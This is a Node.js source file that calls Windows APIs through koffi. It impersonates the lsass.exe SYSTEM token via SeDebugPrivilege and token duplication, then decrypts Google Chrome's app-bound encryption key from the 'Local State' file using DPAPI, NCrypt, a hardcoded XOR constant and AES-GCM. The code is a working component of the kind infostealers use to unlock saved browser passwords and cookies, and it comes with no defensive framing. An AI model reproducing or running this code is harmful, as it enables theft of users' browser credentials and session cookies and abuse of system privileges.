"use strict";

const koffi = require("koffi");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");

const voidPtr = koffi.pointer("void");
const voidPtrPtr = koffi.pointer(voidPtr);
const uint8Ptr = koffi.pointer("uint8_t");
const uint32Ptr = koffi.pointer("uint32_t");

const LUID = koffi.struct({
    LowPart: "uint32_t",
    HighPart: "int32_t"
});

const LUID_AND_ATTRIBUTES = koffi.struct({
    Luid: LUID,
    Attributes: "uint32_t"
});

const TOKEN_PRIVILEGES = koffi.struct({
    PrivilegeCount: "uint32_t",
    Privileges: koffi.array(LUID_AND_ATTRIBUTES, 1)
});

const DATA_BLOB = koffi.struct({
    cbData: "uint32_t",
    pbData: uint8Ptr
});

const DATA_BLOB_PTR = koffi.pointer(DATA_BLOB);

const PROCESSENTRY32 = koffi.struct({
    dwSize: "uint32_t",
    cntUsage: "uint32_t",
    th32ProcessID: "uint32_t",
    th32DefaultHeapID: "uintptr_t",
    th32ModuleID: "uint32_t",
    cntThreads: "uint32_t",
    th32ParentProcessID: "uint32_t",
    pcPriClassBase: "int32_t",
    dwFlags: "uint32_t",
    szExeFile: koffi.array("char", 260)
});

const kernel32 = koffi.load("kernel32.dll");
const advapi32 = koffi.load("advapi32.dll");
const crypt32 = koffi.load("crypt32.dll");
const ncrypt = koffi.load("ncrypt.dll");

const GetCurrentProcess = kernel32.func("__stdcall", "GetCurrentProcess", voidPtr, []);
const LookupPrivilegeValueA = advapi32.func("__stdcall", "LookupPrivilegeValueA", "int", ["str", "str", koffi.pointer(LUID)]);
const AdjustTokenPrivileges = advapi32.func("__stdcall", "AdjustTokenPrivileges", "int", [voidPtr, "int", koffi.pointer(TOKEN_PRIVILEGES), "uint32_t", "void*", "void*"]);
const SetThreadToken = advapi32.func("__stdcall", "SetThreadToken", "int", [voidPtr, voidPtr]);
const CryptUnprotectData = crypt32.func("__stdcall", "CryptUnprotectData", "int", [DATA_BLOB_PTR, "void*", "void*", "void*", "void*", "uint32_t", DATA_BLOB_PTR]);
const GetLastError = kernel32.func("__stdcall", "GetLastError", "uint32_t", []);
const CreateToolhelp32Snapshot = kernel32.func("__stdcall", "CreateToolhelp32Snapshot", voidPtr, ["uint32_t", "uint32_t"]);
const Process32First = kernel32.func("__stdcall", "Process32First", "int", [voidPtr, koffi.pointer(PROCESSENTRY32)]);
const Process32Next = kernel32.func("__stdcall", "Process32Next", "int", [voidPtr, koffi.pointer(PROCESSENTRY32)]);
const OpenProcess = kernel32.func("__stdcall", "OpenProcess", voidPtr, ["uint32_t", "int", "uint32_t"]);
const CloseHandle = kernel32.func("__stdcall", "CloseHandle", "int", [voidPtr]);
const NCryptOpenStorageProvider = ncrypt.func("__stdcall", "NCryptOpenStorageProvider", "int", [voidPtrPtr, "str16", "uint32_t"]);
const NCryptOpenKey = ncrypt.func("__stdcall", "NCryptOpenKey", "int", [voidPtr, voidPtrPtr, "str16", "uint32_t", "uint32_t"]);
const NCryptDecrypt = ncrypt.func("__stdcall", "NCryptDecrypt", "int", [voidPtr, uint8Ptr, "uint32_t", "void*", uint8Ptr, "uint32_t", uint32Ptr, "uint32_t"]);
const NCryptFreeObject = ncrypt.func("__stdcall", "NCryptFreeObject", "int", [voidPtr]);
const OpenProcessToken = advapi32.func("__stdcall", "OpenProcessToken", "int", [voidPtr, "uint32_t", voidPtrPtr]);
const DuplicateTokenEx = advapi32.func("__stdcall", "DuplicateTokenEx", "int", [voidPtr, "uint32_t", "void*", "int", "int", voidPtrPtr]);

function setPrivilege(privilegeName) {
    const processHandle = GetCurrentProcess();
    const tokenHandleBuffer = Buffer.alloc(8);
    if (!OpenProcessToken(processHandle, 40, tokenHandleBuffer)) return false;

    const tokenHandle = koffi.decode(tokenHandleBuffer, voidPtr);
    const luidBuffer = Buffer.alloc(koffi.sizeof(LUID));
    if (!LookupPrivilegeValueA(null, privilegeName, luidBuffer)) {
        CloseHandle(tokenHandle);
        return false;
    }

    const tp = {
        PrivilegeCount: 1,
        Privileges: [{
            Luid: koffi.decode(luidBuffer, LUID),
            Attributes: 2
        }]
    };

    const result = AdjustTokenPrivileges(tokenHandle, 0, tp, 0, null, null);
    const error = GetLastError();
    CloseHandle(tokenHandle);

    return !!result && error !== 1300;
}

function getLsassPid() {
    const snapshot = CreateToolhelp32Snapshot(2, 0);
    if (!snapshot) return null;

    const entrySize = koffi.sizeof(PROCESSENTRY32);
    const entryBuffer = Buffer.alloc(entrySize);
    entryBuffer.writeUInt32LE(entrySize, 0);

    let pid = null;
    if (Process32First(snapshot, entryBuffer)) {
        do {
            const entry = koffi.decode(entryBuffer, PROCESSENTRY32);
            const exeName = Buffer.from(entry.szExeFile).toString().split("\0")[0];
            if (exeName.toLowerCase() === "lsass.exe") {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, entryBuffer));
    }
    CloseHandle(snapshot);
    return pid;
}

function impersonateLsass() {
    setPrivilege("SeDebugPrivilege");
    const pid = getLsassPid();
    if (!pid) return false;

    const processHandle = OpenProcess(4096, 0, pid);
    if (!processHandle) return false;

    const tokenHandleBuf = Buffer.alloc(8);
    if (!OpenProcessToken(processHandle, 10, tokenHandleBuf)) {
        CloseHandle(processHandle);
        return false;
    }

    const tokenHandle = koffi.decode(tokenHandleBuf, voidPtr);
    const duplicatedTokenBuf = Buffer.alloc(8);
    if (!DuplicateTokenEx(tokenHandle, 33554432, null, 2, 2, duplicatedTokenBuf)) {
        CloseHandle(tokenHandle);
        CloseHandle(processHandle);
        return false;
    }

    const duplicatedToken = koffi.decode(duplicatedTokenBuf, voidPtr);
    const success = SetThreadToken(null, duplicatedToken);

    CloseHandle(duplicatedToken);
    CloseHandle(tokenHandle);
    CloseHandle(processHandle);

    return !!success;
}

function revertImpersonation() {
    SetThreadToken(null, null);
}

function dpapiDecrypt(data) {
    if (!data || data.length === 0) return null;
    const input = { cbData: data.length, pbData: data };
    const outputBuffer = Buffer.alloc(koffi.sizeof(DATA_BLOB));

    if (CryptUnprotectData(input, null, null, null, null, 0, outputBuffer)) {
        const outputBlob = koffi.decode(outputBuffer, DATA_BLOB);
        const decryptedData = koffi.decode(outputBlob.pbData, "uint8_t", outputBlob.cbData);
        return Buffer.from(decryptedData);
    }
    return null;
}

function ncryptDecryptAppBound(encryptedKey) {
    const providerPtr = Buffer.alloc(8);
    if (NCryptOpenStorageProvider(providerPtr, "Microsoft Software Key Storage Provider", 0) !== 0) return null;
    const provider = koffi.decode(providerPtr, voidPtr);

    const keyPtr = Buffer.alloc(8);
    if (NCryptOpenKey(provider, keyPtr, "Google Chromekey1", 0, 0) !== 0) {
        NCryptFreeObject(provider);
        return null;
    }
    const key = koffi.decode(keyPtr, voidPtr);

    const sizePtr = Buffer.alloc(4);
    if (NCryptDecrypt(key, encryptedKey, encryptedKey.length, null, null, 0, sizePtr, 64) !== 0) {
        NCryptFreeObject(key);
        NCryptFreeObject(provider);
        return null;
    }

    const outSize = sizePtr.readUInt32LE(0);
    const output = Buffer.alloc(outSize);
    if (NCryptDecrypt(key, encryptedKey, encryptedKey.length, null, output, outSize, sizePtr, 64) !== 0) {
        NCryptFreeObject(key);
        NCryptFreeObject(provider);
        return null;
    }

    NCryptFreeObject(key);
    NCryptFreeObject(provider);
    return output.slice(0, sizePtr.readUInt32LE(0));
}

function xorBuffers(buf1, buf2) {
    const result = Buffer.alloc(buf1.length);
    for (let i = 0; i < buf1.length; i++) {
        result[i] = buf1[i] ^ buf2[i];
    }
    return result;
}

function decryptKeyWithAES(data) {
    let offset = 0;
    const v10Size = data.readUInt32LE(offset); offset += 4;
    offset += v10Size; // Skip v10 data

    const v11Size = data.readUInt32LE(offset); offset += 4;
    const version = data[offset]; offset += 1;

    if (version === 3) {
        const appBoundKey = data.slice(offset, offset + 32); offset += 32;
        const iv = data.slice(offset, offset + 12); offset += 12;
        const encryptedValue = data.slice(offset, offset + 32); offset += 32;
        const authTag = data.slice(offset, offset + 16); offset += 16;

        let decryptedAppBound;
        try {
            decryptedAppBound = ncryptDecryptAppBound(appBoundKey);
            if (!decryptedAppBound) return null;
        } catch (e) { return null; }

        const hardcodedMix = Buffer.from("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390", "hex");
        const aesKey = xorBuffers(decryptedAppBound, hardcodedMix);

        const decipher = crypto.createDecipheriv("aes-256-gcm", aesKey, iv);
        decipher.setAuthTag(authTag);

        try {
            return Buffer.concat([decipher.update(encryptedValue), decipher.final()]);
        } catch (e) { return null; }
    }
    return null;
}

function copyLocalState(filePath) {
    try {
        const tempDir = path.join(process.env.TEMP || "C:\\Windows\\Temp", "browser_temp");
        if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
        const target = path.join(tempDir, "LocalState_" + Date.now() + ".tmp");
        fs.copyFileSync(filePath, target);
        fs.chmodSync(target, 438);
        return target;
    } catch (e) { return null; }
}

async function getAppBoundKey(userDataPath) {
    let tempFile = null;
    try {
        const localStatePath = path.join(userDataPath, "Local State");
        if (!fs.existsSync(localStatePath)) return null;

        tempFile = copyLocalState(localStatePath);
        if (!tempFile) return null;

        const localState = JSON.parse(fs.readFileSync(tempFile, "utf8"));
        const base64Key = localState.os_crypt?.app_bound_encrypted_key;
        if (!base64Key) return null;

        const encryptedData = Buffer.from(base64Key, "base64");
        if (encryptedData.slice(0, 4).toString() !== "APPB") return null;

        const appBoundPayload = encryptedData.slice(4);
        let finalKey = null;

        if (impersonateLsass()) {
            try {
                const step1 = dpapiDecrypt(appBoundPayload);
                if (step1) {
                    const step2 = dpapiDecrypt(step1);
                    if (step2) {
                        finalKey = decryptKeyWithAES(step2);
                    }
                }
            } finally {
                revertImpersonation();
            }
        }
        return finalKey;
    } catch (e) {
        return null;
    } finally {
        if (tempFile && fs.existsSync(tempFile)) {
            try { fs.unlinkSync(tempFile); } catch (e) {}
        }
    }
}

exports.impersonateLsass = impersonateLsass;
exports.revertImpersonation = revertImpersonation;
exports.getAppBoundKey = getAppBoundKey;
